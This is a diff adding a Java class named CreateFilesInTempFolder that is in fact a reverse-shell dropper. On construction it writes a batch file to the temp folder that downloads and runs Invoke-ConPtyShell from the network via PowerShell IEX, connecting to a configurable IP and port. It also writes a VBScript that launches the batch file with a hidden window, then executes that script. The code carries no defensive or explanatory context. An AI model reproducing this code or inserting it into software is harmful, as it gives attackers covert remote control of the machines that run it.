@@ -1,0 +1,45 @@
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+public class CreateFilesInTempFolder {
+
+    public CreateFilesInTempFolder(){
+        String tempFolderPath = System.getProperty("java.io.tmpdir");
+        // assign an ip and a port before execution
+        String ip = "";
+        String port = "";
+
+        // File 1: rssh.bat
+        String rsshBatContent = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell" + " " + ip + " " + port;
+        createFile(tempFolderPath, "rssh.bat", rsshBatContent);
+
+        // File 2: rssh.vbs
+        //String vbsContent = "CreateObject(\"Wscript.Shell\").Run \"C:\\Users\\ultei\\AppData\\Local\\Temp\\rssh.bat\", 0, True";
+        String vbsContent = "CreateObject(\"Wscript.Shell\").Run \"" + tempFolderPath + "\\rssh.bat\", 0, True";
+        createFile(tempFolderPath, "rssh.vbs", vbsContent);
+
+        // Run the VBScript file
+        String vbsFilePath=tempFolderPath+"\\rssh.vbs";
+        runVBScript(vbsFilePath);
+    }
+
+    private String createFile(String folderPath, String fileName, String content) {
+        File file = new File(folderPath, fileName);
+        try (FileWriter writer = new FileWriter(file)) {
+            writer.write(content);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return file.getAbsolutePath();
+    }
+
+    private void runVBScript(String vbsFilePath) {
+        try {
+            // Execute VBScript using wscript.exe
+            Runtime.getRuntime().exec("wscript \"" + vbsFilePath + "\"");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
